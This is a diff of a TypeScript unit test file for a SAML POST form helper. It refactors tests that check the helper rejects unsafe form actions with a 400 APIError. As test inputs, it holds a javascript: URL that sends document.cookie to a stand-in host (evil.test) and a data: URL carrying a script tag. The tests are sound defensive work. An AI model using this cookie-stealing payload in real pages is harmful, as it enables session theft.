@@ -1,5 +1,26 @@
+import { APIError } from "better-auth/api";
 import { describe, expect, it } from "vitest";
 import { createSAMLPostForm } from "./helpers";
+
+const invalidSAMLBindingLocationMessage =
+	"SAML POST binding location must be an absolute http or https URL";
+
+function expectInvalidSAMLBindingLocation(action: string) {
+	try {
+		createSAMLPostForm(action, "SAMLResponse", "base64value");
+		expect.unreachable();
+	} catch (error) {
+		expect(error).toBeInstanceOf(APIError);
+		expect(error).toMatchObject({
+			status: "BAD_REQUEST",
+			statusCode: 400,
+			message: invalidSAMLBindingLocationMessage,
+			body: {
+				message: invalidSAMLBindingLocationMessage,
+			},
+		});
+	}
+}
 
 describe("createSAMLPostForm", () => {
 	it("emits an http(s) form action", async () => {
@@ -13,22 +34,12 @@ describe("createSAMLPostForm", () => {
 	});
 
 	it("rejects a javascript: form action", () => {
-		expect(() =>
-			createSAMLPostForm(
-				"javascript:fetch('https://evil.test/x?c='+document.cookie)",
-				"SAMLResponse",
-				"base64value",
-			),
-		).toThrow();
+		expectInvalidSAMLBindingLocation(
+			"javascript:fetch('https://evil.test/x?c='+document.cookie)",
+		);
 	});
 
 	it("rejects a data: form action", () => {
-		expect(() =>
-			createSAMLPostForm(
-				"data:text/html,<script>1</script>",
-				"SAMLResponse",
-				"base64value",
-			),
-		).toThrow();
+		expectInvalidSAMLBindingLocation("data:text/html,<script>1</script>");
 	});
 });
